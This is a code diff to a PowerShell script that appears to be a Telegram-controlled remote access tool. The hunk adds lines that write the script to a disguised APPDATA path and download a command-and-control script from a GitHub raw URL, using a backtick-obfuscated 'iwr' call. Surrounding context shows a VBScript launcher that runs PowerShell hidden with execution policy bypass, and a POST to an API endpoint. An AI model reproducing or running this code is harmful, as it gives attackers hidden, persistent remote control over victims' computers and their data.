@@ -452,8 +452,12 @@ Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 
 Function PauseSession{
 $newScriptPath = "$env:APPDATA\Microsoft\Windows\temp.ps1"
-sleep 1
-$scriptDirectory | Out-File -FilePath $newScriptPath -Force
+$scriptContent | Out-File -FilePath $newScriptPath -force
+    if ($newScriptPath.Length -eq 0){
+        "`$tg = $tg" | Out-File -FilePath $newScriptPath -Force
+        i`wr -Uri "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-C2.ps1" -OutFile "$env:temp/temp.ps1"
+        Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
+        }
 $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\temp.ps1""", 0, True
@@ -464,7 +468,6 @@ sleep 2
 Start-Process -FilePath $pth
 break
 }
-
 # --------------------------------------------- TELEGRAM FUCTIONS -------------------------------------------------
 
 Function IsAuth{ 
